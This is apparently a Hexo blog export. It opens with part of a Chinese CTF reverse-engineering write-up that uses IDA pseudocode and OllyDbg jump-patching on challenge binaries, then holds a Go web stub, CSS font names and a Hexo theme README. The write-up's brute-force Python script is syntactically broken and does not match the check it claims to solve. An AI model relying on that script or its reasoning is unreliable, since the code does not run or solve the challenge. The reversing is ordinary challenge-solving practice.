class="language-lang-txt">flag{cdusec_rec2_easy}</code></pre><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>IDA中F5查看伪代码（32位）</p><pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp){  signed int v3; // esi@1  signed int v4; // ecx@1  int result; // eax@11  char v6; // [sp+8h] [bp-8h]@1  char v7; // [sp+9h] [bp-7h]@4  char v8; // [sp+Ah] [bp-6h]@4  char v9[5]; // [sp+Bh] [bp-5h]@4  v3 = 1;  printf(Format);  scanf(aS, &v6);  v4 = 0;  do  {    if ( v4 % 4 )      goto LABEL_9;    if ( !(v4 / 4) )    {      if ( *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251 )        goto LABEL_9;LABEL_8:      v3 = 0;      goto LABEL_9;    }    if ( v4 / 4 == 1 && *(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365 )      goto LABEL_8;LABEL_9:    ++v4;  }  while ( v4 < 8 );  if ( v3 == 1 )  {    printf(aFlagS_1, &v6);    result = system(Command);  }  else  {    printf(aWrongKey);    result = system(Command);c  }  return result;}</code></pre><p>发现flag的前四位要满足</p><pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) == 1937073251</code></pre><p>后四位要满足</p><pre class=" language-lang-c"><code class="language-lang-c">*(&v6 + v4) + ((*(&v7 + v4) + ((*(&v8 + v4) + (v9[v4] << 8)) << 8)) << 8) != 1701995365</code></pre><p>也就是说flag总共有8位</p><p>先来一手猜flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">cdus ecre</code></pre><p>刚好八位（手动斜眼笑）</p><p>成功得到flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><p>开个玩笑，这题还是要写脚本的</p><p>取出表达式</p><pre class=" language-lang-c"><code class="language-lang-c">v1 + (( v2 + ((v3 + (v4 << 8)) << 8)) << 8) == 1937073251v5 + (( v6 + ((v7 + (v8 << 8)) << 8)) << 8) == 1937073251</code></pre><pre class=" language-lang-python"><code class="language-lang-python">flag='qwertyuiopasdfghjklzxcvbnm'def run(number):    for a in range flag:        for b in range flag:            for c in range flag:                for d in range flag:                    if ord(a)+ord(b)+ord(c)+ord(d)=number:                        print a+b+c+drun()</code></pre><pre class=" language-lang-txt"><code class="language-lang-txt">flag{cdusecre_1}</code></pre><h2 id="点击1000次"><a href="#点击1000次" class="headerlink" title="点击1000次"></a>点击1000次</h2><p>如果说re里边最难的那一个的话，那应该就是这道题了，出题人给的hint建议是用ollydbg做，没学过，花了半天的时间学了一下，然后开始本题</p><p>题目上写的是点击1000次给一个flag字符，童叟无欺。</p><p>先用IDA 查看伪代码(32位)</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401277(){  int result; // eax@3  unsigned __int8 *v1; // [sp+0h] [bp-8h]@1  void *lpMem; // [sp+4h] [bp-4h]@1  lpMem = (void *)sub_4015F2(1, ++dword_4A32C0);  v1 = (unsigned __int8 *)sub_40121B((unsigned int)&unk_480B5F);  if ( lpMem )    sub_4015FE(lpMem);  result = sub_4015F8((HWND)0x52010001, 100728832, 8, -1, v1, 0);  if ( v1 )    result = sub_4015FE(v1);  if ( dword_4A32C0 == 1000 )  {    result = sub_401323();    dword_4A32C0 = 0;  }  return result;}</code></pre><p>从代码我们可以猜到</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C0 == 1000</code></pre><p>这个就是判断的条件</p><p>那么这个</p><pre class=" language-lang-c"><code class="language-lang-c">sub_401323()</code></pre><p>是干什么的呢？</p><p>跟进去看看</p><pre class=" language-lang-c"><code class="language-lang-c">int sub_401323(){  int result; // eax@13  char v1; // al@16  void *lpMem; // [sp+4h] [bp-8h]@16  if ( dword_4A32C4 == 1 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 2 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 3 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 4 )    sub_4015F2(2, 1);  if ( dword_4A32C4 == 5 )    sub_4015F2(2, 1);  result = dword_4A32C4 > 5 && dword_4A32C4 < 18;//不难发现这个是判断flag{}括号里的字符数的  if ( result )  {    v1 = sub_4015F2(2, 1);    lpMem = (void *)sub_4015F2(1, v1);    result = sub_4015F2(2, 1);    if ( lpMem )      result = sub_4015FE(lpMem);  }  if ( dword_4A32C4 == 18 )    result = sub_4015F2(2, 1);  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;  return result;}</code></pre><p>说实话一开始真没看懂，等到我用OD做出</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{55381</code></pre><p>我才知道这个函数是干什么的</p><p>找到函数的判断点后,进入OD调试</p><pre class=" language-lang-txt"><code class="language-lang-txt">text:00401300                 cmp     dword_4A32C0, 3E8h</code></pre><p>看到判断位置，下断点，右键将数值修改为3E7（也就是999），然后在点击一下</p><p>就会出来一个flag字符</p><p>但当字符数达到10个以上的时候flag就会变成<em>*</em></p><p>猜测</p><pre class=" language-lang-c"><code class="language-lang-c">  if ( dword_4A32C4 > 10 ) //这个函数是把flag给变成*****的    result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);  ++dword_4A32C4;</code></pre><p>是这个函数的作用，找到汇编代码，把</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jle     loc_40156C</code></pre><p>修改为</p><pre class=" language-lang-txt"><code class="language-lang-txt">.text:00401549                 jge     loc_40156C</code></pre><p>也就是把判断条件改为了</p><pre class=" language-lang-c"><code class="language-lang-c">dword_4A32C4 < 10</code></pre><p>因为现在我们的字符数已经大于10了，所以</p><pre class=" language-lang-c"><code class="language-lang-c">result = sub_4015F8((HWND)0x52010001, 369164292, 18, -1, (unsigned __int8 *)2, 0);</code></pre><p>这个函数就不会在运行</p><p>再按之前的操作走一遍</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{5538189634510}</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go-web</title>
      <link href="/2019/11/08/go-web/go-web/"/>
      <url>/2019/11/08/go-web/go-web/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-Go与-Web-应用"><a href="#第一章-Go与-Web-应用" class="headerlink" title="第一章 Go与 Web 应用"></a>第一章 Go与 Web 应用</h1><h2 id="1-1-使用Go-语言构建Web-应用"><a href="#1-1-使用Go-语言构建Web-应用" class="headerlink" title="1.1 使用Go 语言构建Web 应用"></a>1.1 使用Go 语言构建Web 应用</h2><p>​    “为什么要使用Go语言编写web应用”，Go作为一门比较年轻的编程语言，个人认为比较符合现代发展的趋势，它非常适合用来编写那些需要快速运行的服务器端程序。Go语言提供了很多过程式编程语言的特性，其提供了函数式编程方面的特性，以及现代化的包管理系统，垃圾收集特性以及标准库</p><p>​    在大规模的Web应用方面，Go提供了一种不同于现有语言和平台但又切实可行的方案，大规模可扩展的Web应用通常需要具备以下特性：</p><ul><li>可扩展性</li><li>模块化</li><li>可维护性</li><li>高性能</li></ul><h3 id="1-1-1-Go与可扩展Web应用"><a href="#1-1-1-Go与可扩展Web应用" class="headerlink" title="1.1.1 Go与可扩展Web应用"></a>1.1.1 Go与可扩展Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-2-Go-与模块化的Web应用"><a href="#1-1-2-Go-与模块化的Web应用" class="headerlink" title="1.1.2 Go 与模块化的Web应用"></a>1.1.2 Go 与模块化的Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-3-Go-与可维护的Web应用"><a href="#1-1-3-Go-与可维护的Web应用" class="headerlink" title="1.1.3 Go 与可维护的Web应用"></a>1.1.3 Go 与可维护的Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h3 id="1-1-4-Go与高性能Web应用"><a href="#1-1-4-Go与高性能Web应用" class="headerlink" title="1.1.4 Go与高性能Web应用"></a>1.1.4 Go与高性能Web应用</h3><p>//看到实例后补充，暂时不做分析</p><h2 id="1-2-Web应用工作原理"><a href="#1-2-Web应用工作原理" class="headerlink" title="1.2 Web应用工作原理"></a>1.2 Web应用工作原理</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Go-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> Go </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS-pingfang</title>
      <link href="/2019/11/08/html/css/css-pingfang/"/>
      <url>/2019/11/08/html/css/css-pingfang/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS常用的苹方字体"><a href="#CSS常用的苹方字体" class="headerlink" title="CSS常用的苹方字体"></a>CSS常用的苹方字体</h1><p>字体对网页的美观性有时候也起着很关键的作用</p><p>以下是从网上收集到的苹果的苹方字体（自用，不可商用，字体有版权！！！）：</p><pre class=" language-lang-css"><code class="language-lang-css">// 苹方-简 常规体font-family: PingFangSC-Regular, sans-serif;// 苹方-简 极细体font-family: PingFangSC-Ultralight, sans-serif;// 苹方-简 细体font-family: PingFangSC-Light, sans-serif;// 苹方-简 纤细体font-family: PingFangSC-Thin, sans-serif;// 苹方-简 中黑体font-family: PingFangSC-Medium, sans-serif;// 苹方-简 中粗体font-family: PingFangSC-Semibold, sans-serif;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html </tag>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客主题之hexo-theme-matery的介绍</title>
      <link href="/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/"/>
      <url>/2018/09/28/html/hexo-bo-ke-zhu-ti-zhi-hexo-theme-matery-de-jie-shao/</url>
      
        <content type="html"><![CDATA[<p><a href="README.md">English Document</a> | <a href="https://blinkfox.github.io/" target="_blank" rel="noopener">演示示例</a> | QQ交流群:<code>926552981</code></p><blockquote><p>这是一个采用<code>Material Design</code>和响应式设计的 Hexo 博客主题。</p></blockquote><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>简单漂亮，文章内容美观易读</li><li><a href="https://material.io/" target="_blank" rel="noopener">Material Design</a> 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 <code>Banner</code> 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 <code>24</code> 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li><strong>词云</strong>的标签页和<strong>雷达图</strong>的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 <code>MathJax</code></li><li><code>TOC</code> 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li><a href="https://gitalk.github.io/" target="_blank" rel="noopener">Gitalk</a>、<a href="https://imsun.github.io/gitment/" target="_blank" rel="noopener">Gitment</a>、<a href="https://valine.js.org/" target="_blank" rel="noopener">Valine</a> 和 <a href="https://disqus.com/" target="_blank" rel="noopener">Disqus</a> 评论模块（推荐使用 <code>Gitalk</code>）</li><li>集成了<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>当你看到这里的时候，应该已经有一个自己的 <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 博客了。如果还没有的话，不妨使用 Hexo 和 <a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">Markdown</a> 来写博客和文章。</p><p>点击 <a href="https://codeload.github.com/blinkfox/hexo-theme-matery/zip/master" target="_blank" rel="noopener">这里</a> 下载 <code>master</code> 分支的最新稳定版的代码，解压缩后，将 <code>hexo-theme-matery</code> 的文件夹复制到你 Hexo 的 <code>themes</code> 文件夹中即可。</p><p>当然你也可以在你的 <code>themes</code> 文件夹下使用 <code>Git clone</code> 命令来下载:</p><pre class=" language-lang-bash"><code class="language-lang-bash">git clone https://github.com/blinkfox/hexo-theme-matery.git</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 的  <code>theme</code> 的值：<code>theme: hexo-theme-matery</code></p><h4 id="config-yml-文件的其它修改建议"><a href="#config-yml-文件的其它修改建议" class="headerlink" title="_config.yml 文件的其它修改建议:"></a><code>_config.yml</code> 文件的其它修改建议:</h4><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 <code>6</code> 的倍数，如：<code>12</code>、<code>18</code> 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h3 id="新建分类-categories-页"><a href="#新建分类-categories-页" class="headerlink" title="新建分类 categories 页"></a>新建分类 categories 页</h3><p><code>categories</code> 页是用来展示所有分类的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>categories/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "categories"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/categories/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: categoriesdate: 2018-09-30 17:25:30type: "categories"layout: "categories"---</code></pre><h3 id="新建标签-tags-页"><a href="#新建标签-tags-页" class="headerlink" title="新建标签 tags 页"></a>新建标签 tags 页</h3><p><code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "tags"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: tagsdate: 2018-09-30 18:23:38type: "tags"layout: "tags"---</code></pre><h3 id="新建关于我-about-页"><a href="#新建关于我-about-页" class="headerlink" title="新建关于我 about 页"></a>新建关于我 about 页</h3><p><code>about</code> 页是用来展示<strong>关于我和我的博客</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>about/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "about"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/about/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: aboutdate: 2018-09-30 17:25:30type: "about"layout: "about"---</code></pre><h3 id="新建友情连接-friends-页（可选的）"><a href="#新建友情连接-friends-页（可选的）" class="headerlink" title="新建友情连接 friends 页（可选的）"></a>新建友情连接 friends 页（可选的）</h3><p><code>friends</code> 页是用来展示<strong>友情连接</strong>信息的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>friends/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">hexo new page "friends"</code></pre><p>编辑你刚刚新建的页面文件 <code>/source/friends/index.md</code>，至少需要以下内容：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: friendsdate: 2018-12-12 21:25:30type: "friends"layout: "friends"---</code></pre><p>同时，在你的博客 <code>source</code> 目录下新建 <code>_data</code> 目录，在 <code>_data</code> 目录中新建 <code>friends.json</code> 文件，文件内容如下所示：</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "avatar": "http://image.luokangyuan.com/1_qq_27922023.jpg",    "name": "码酱",    "introduction": "我不是大佬，只是在追寻大佬的脚步",    "url": "http://luokangyuan.com/",    "title": "前去学习"}, {    "avatar": "http://image.luokangyuan.com/4027734.jpeg",    "name": "闪烁之狐",    "introduction": "编程界大佬，技术牛，人还特别好，不懂的都可以请教大佬",    "url": "https://blinkfox.github.io/",    "title": "前去学习"}, {    "avatar": "http://image.luokangyuan.com/avatar.jpg",    "name": "ja_rome",    "introduction": "平凡的脚步也可以走出伟大的行程",    "url": "ttps://me.csdn.net/jlh912008548",    "title": "前去学习"}]</code></pre><h3 id="代码高亮"><a href="#代码高亮" class="headerlink" title="代码高亮"></a>代码高亮</h3><p>由于 Hexo 自带的代码高亮主题显示不好看，所以主题中使用到了 <a href="https://github.com/ele828/hexo-prism-plugin" target="_blank" rel="noopener">hexo-prism-plugin</a> 的 Hexo 插件来做代码高亮，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i -S hexo-prism-plugin</code></pre><p>然后，修改 Hexo 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">highlight:  enable: falseprism_plugin:  mode: 'preprocess'    # realtime/preprocess  theme: 'tomorrow'  line_number: false    # default false  custom_css:</code></pre><h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><p>本主题中还使用到了 <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-search --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">search:  path: search.xml  field: post</code></pre><h3 id="中文链接转拼音（可选的）"><a href="#中文链接转拼音（可选的）" class="headerlink" title="中文链接转拼音（可选的）"></a>中文链接转拼音（可选的）</h3><p>如果你的文章名称是中文的，那么 Hexo 默认生成的永久链接也会有中文，这样不利于 <code>SEO</code>，且 <code>gitment</code> 评论对中文链接也不支持。我们可以用 <a href="https://github.com/viko16/hexo-permalink-pinyin" target="_blank" rel="noopener">hexo-permalink-pinyin</a> Hexo 插件使在生成文章时生成中文拼音的永久链接。</p><p>安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i hexo-permalink-pinyin --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">permalink_pinyin:  enable: true  separator: '-' # default: '-'</code></pre><blockquote><p><strong>注</strong>：除了此插件外，<a href="https://github.com/rozbo/hexo-abbrlink" target="_blank" rel="noopener">hexo-abbrlink</a> 插件也可以生成非中文的链接。</p></blockquote><h3 id="文章字数统计插件（可选的）"><a href="#文章字数统计插件（可选的）" class="headerlink" title="文章字数统计插件（可选的）"></a>文章字数统计插件（可选的）</h3><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">hexo-wordcount</a>插件。</p><p>安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，激活以下配置项即可：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">wordCount:  enable: false # 将这个值设置为 true 即可.  postWordCount: true  min2read: true  totalCount: true</code></pre><h3 id="添加-RSS-订阅支持（可选的）"><a href="#添加-RSS-订阅支持（可选的）" class="headerlink" title="添加 RSS 订阅支持（可选的）"></a>添加 RSS 订阅支持（可选的）</h3><p>本主题中还使用到了 <a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 的 Hexo 插件来做 <code>RSS</code>，安装命令如下：</p><pre class=" language-lang-bash"><code class="language-lang-bash">npm install hexo-generator-feed --save</code></pre><p>在 Hexo 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: ' '  order_by: -date</code></pre><p>执行 <code>hexo clean &amp;&amp; hexo g</code> 重新生成博客文件，然后在 <code>public</code> 文件夹中即可看到 <code>atom.xml</code> 文件，说明你已经安装成功了。</p><h3 id="修改页脚"><a href="#修改页脚" class="headerlink" title="修改页脚"></a>修改页脚</h3><p>页脚信息可能需要做定制化修改，而且它不便于做成配置信息，所以可能需要你自己去再修改和加工。修改的地方在主题文件的 <code>/layout/_partial/footer.ejs</code> 文件中，包括站点、使用的主题、访问量等。</p><h3 id="修改社交链接"><a href="#修改社交链接" class="headerlink" title="修改社交链接"></a>修改社交链接</h3><p>在主题的 <code>_config.yml</code> 文件中，默认支持 <code>QQ</code>、<code>GitHub</code> 和邮箱的配置，你可以在主题文件的 <code>/layout/_partial/social-link.ejs</code> 文件中，新增、修改你需要的社交链接地址，增加链接可参考如下代码：</p><pre class=" language-lang-html"><code class="language-lang-html"><a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">    <i class="fa fa-github"></i></a></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fa-facebook</code></li><li>Twitter: <code>fa-twitter</code></li><li>Google-plus: <code>fa-google-plus</code></li><li>Linkedin: <code>fa-linkedin</code></li><li>Tumblr: <code>fa-tumblr</code></li><li>Medium: <code>fa-medium</code></li><li>Slack: <code>fa-slack</code></li><li>新浪微博: <code>fa-weibo</code></li><li>微信: <code>fa-wechat</code></li><li>QQ: <code>fa-qq</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>4.7.0</code>。</p></blockquote><h3 id="修改打赏的二维码图片"><a href="#修改打赏的二维码图片" class="headerlink" title="修改打赏的二维码图片"></a>修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="配置音乐播放器（可选的）"><a href="#配置音乐播放器（可选的）" class="headerlink" title="配置音乐播放器（可选的）"></a>配置音乐播放器（可选的）</h3><p>要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>首先，在你的博客 <code>source</code> 目录下的 <code>_data</code> 目录（没有的话就新建一个）中新建 <code>musics.json</code> 文件，文件内容如下所示：</p><pre class=" language-lang-json"><code class="language-lang-json">[{    "name": "五月雨变奏电音",    "artist": "AnimeVibe",    "url": "http://xxx.com/music1.mp3",    "cover": "http://xxx.com/music-cover1.png"}, {    "name": "Take me hand",    "artist": "DAISHI DANCE,Cecile Corbel",    "url": "/medias/music/music2.mp3",    "cover": "/medias/music/cover2.png"}, {    "name": "Shape of You",    "artist": "J.Fla",    "url": "http://xxx.com/music3.mp3",    "cover": "http://xxx.com/music-cover3.png"}]</code></pre><blockquote><p><strong>注</strong>：以上 JSON 中的属性：<code>name</code>、<code>artist</code>、<code>url</code>、<code>cover</code> 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p></blockquote><p>然后，在主题的 <code>_config.yml</code> 配置文件中激活配置即可：</p><pre class=" language-lang-yaml"><code class="language-lang-yaml"># 是否在首页显示音乐.music:  enable: true  showTitle: false  title: 听听音乐  fixed: false # 是否开启吸底模式  autoplay: false # 是否自动播放  theme: '#42b983'  loop: 'all' # 音频循环播放, 可选值: 'all', 'one', 'none'  order: 'list' # 音频循环顺序, 可选值: 'list', 'random'  preload: 'auto' # 预加载，可选值: 'none', 'metadata', 'auto'  volume: 0.7 # 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效  listFolded: false # 列表默认折叠  listMaxHeight: # 列表最大高度</code></pre><h2 id="文章-Front-matter-介绍"><a href="#文章-Front-matter-介绍" class="headerlink" title="文章 Front-matter 介绍"></a>文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><div class="table-container"><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr></tbody></table></div><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---</code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class=" language-lang-yaml"><code class="language-lang-yaml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 